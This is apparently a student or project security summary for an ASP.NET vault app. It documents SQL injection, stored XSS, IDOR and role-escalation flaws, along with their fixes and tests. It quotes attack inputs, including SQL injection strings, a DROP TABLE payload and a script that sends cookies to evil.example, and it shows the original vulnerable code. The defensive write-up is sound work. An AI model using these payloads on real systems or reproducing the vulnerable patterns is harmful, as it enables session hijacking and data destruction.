# SafeVault — Security Summary

## 1. Vulnerabilities identified

### 1.1 SQL injection (admin user-search feature)
The original user-search code built its query by concatenating the search
box value directly into the SQL string:

```csharp
var sql = "SELECT Id, UserName, Email FROM AspNetUsers WHERE UserName = '" + searchTerm + "'";
```

A search term like `' OR '1'='1` turned the `WHERE` clause into a tautology
and dumped every user row; a term like `'; DROP TABLE AspNetUsers; --` could
destroy data outright. This was the most severe issue found, since it
threatened both confidentiality (full user table exposure) and integrity
(arbitrary statement execution).

### 1.2 Stored Cross-Site Scripting (XSS) in vault items
The `Title`/`Notes` fields on a vault item were saved exactly as submitted
and, in an early prototype view, rendered with `Html.Raw()`. Submitting a
title such as `<script>document.location='https://evil.example/steal?c='+document.cookie</script>`
would execute in the browser of anyone who viewed the item list — a classic
stored-XSS session-hijacking vector.

### 1.3 Broken access control / IDOR on vault items
The delete endpoint originally only checked that a request was
*authenticated*, not that the caller *owned* the item being deleted:

```csharp
[Authorize]
public IActionResult Delete(int id) { /* deletes any item by id */ }
```

Any logged-in user could delete another user's vault items simply by
guessing or incrementing the numeric id (Insecure Direct Object Reference).

### 1.4 Weak/missing password and lockout policy
The initial registration flow accepted any non-empty password and had no
account lockout, making both credential stuffing and brute-force attacks
cheap.

### 1.5 Privilege escalation via self-registration
An earlier draft let a client pass an arbitrary `role` field at registration
time, which — if left unchecked — would let anyone register directly as
`Admin`.

## 2. Fixes applied

| # | Vulnerability | Fix |
|---|---|---|
| 1.1 | SQL injection | Replaced string concatenation with a parameterized `SqliteCommand` (`UsersLookupRepository.SearchByUserNameAsync`) and moved all other data access to EF Core LINQ, which parameterizes automatically. Added `SqlInjectionTests` that feed classic injection payloads through the repository and assert they cannot return extra rows or drop the table. |
| 1.2 | Stored XSS | Added `InputValidator.SanitizeHtml`, backed by `HtmlSanitizer`, and run it on `Title`/`Notes` before they are persisted in `VaultController.Create`. API output is plain JSON (safely encoded by `System.Text.Json`), and `Content-Security-Policy`/`X-Content-Type-Options` headers were added in `Program.cs` as defense in depth. |
| 1.3 | IDOR / broken access control | `VaultController.Delete` now loads the item and explicitly checks `item.OwnerUserId == CurrentUserId` (or `Admin` role) before allowing the delete, returning `403 Forbidden` otherwise. Covered by `AuthorizationTests.User_CannotDeleteAnotherUsersVaultItem`. |
| 1.4 | Weak passwords / brute force | Enforced a strong-password policy both client-side (`InputValidator.IsStrongPassword`) and server-side (`Identity` `PasswordOptions` in `Program.cs`), plus account lockout after 5 failed attempts (`Lockout.MaxFailedAccessAttempts`). |
| 1.5 | Self-assigned Admin role | `AuthController.Register` hard-codes the `User` role for every new account. Role changes are only possible through `UsersController.AssignRole`, which is itself `[Authorize(Roles = "Admin")]` and restricted to a fixed allow-list of role names. |

## 3. Tests written to verify the fixes

- **`InputValidationTests`** — unit tests for username/email/password rules,
  suspicious-SQL-pattern detection, and confirms `SanitizeHtml` strips
  `<script>` tags and inline event handlers (e.g. `onerror=`).
- **`SqlInjectionTests`** — spins up an in-memory SQLite database and runs
  several classic injection payloads (`' OR '1'='1`, `UNION SELECT`,
  `DROP TABLE`) through `UsersLookupRepository`, asserting no extra rows are
  returned and the table still exists afterward.
- **`AuthorizationTests`** — end-to-end tests via `WebApplicationFactory`
  covering: anonymous access to an admin route → `401`; a "User"-role
  account hitting an admin route → `403`; an actual Admin account → `200`;
  and one user attempting to delete another user's vault item → `403`
  (IDOR prevention).

Run everything with:

```bash
dotnet test
```

## 4. How Copilot assisted

- **Generating secure code**: Copilot suggested the initial shape of the
  parameterized `SqliteCommand` in `UsersLookupRepository` and the
  data-annotation attributes on the DTOs, which were then reviewed and
  tightened (e.g., adding explicit length caps and the username regex).
- **Authentication/RBAC scaffolding**: Copilot proposed the ASP.NET Core
  Identity + JWT wiring in `Program.cs` and the `[Authorize(Roles = "Admin")]`
  pattern used across `UsersController`; this was adjusted to add the
  allow-listed role check in `AssignRole` and to prevent self-registration
  as Admin.
- **Debugging**: When pointed at the original (vulnerable) search method and
  the vault delete endpoint, Copilot's chat explanation is what surfaced the
  string-concatenation SQL injection risk and the missing ownership check,
  and it drafted the first version of the corresponding fixes, which were
  then verified with the tests above rather than taken on faith.
- **Test generation**: Copilot drafted the initial injection-payload list
  and the `WebApplicationFactory` test skeleton; both were extended (e.g.
  adding the `DROP TABLE` non-effect assertion, the cross-user delete test)
  to make sure each fix actually had a failing-before/passing-after test
  behind it.
